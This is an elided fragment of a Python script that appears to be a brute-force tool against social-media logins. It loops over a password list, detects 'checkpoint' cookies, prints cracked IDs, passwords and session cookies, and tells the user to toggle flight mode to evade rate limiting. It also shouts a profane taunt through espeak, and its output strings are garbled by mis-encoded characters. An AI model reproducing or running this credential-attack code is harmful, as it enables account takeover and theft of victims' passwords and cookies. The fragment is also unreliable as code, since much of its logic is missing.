...
attemps = 0
os.system('espeak -a 300 " bypass,  User,  Fuck,  You"')
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUse Flight Mode in every 5 minutes')
    print('\033[0;97m===============================================')
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[Jarif-Ok’š] {idf} â€¢ {pw}\n\033[0;93m[ðŸŒº]= COOKIES â€¢ \033[0;92m{kuki} ')
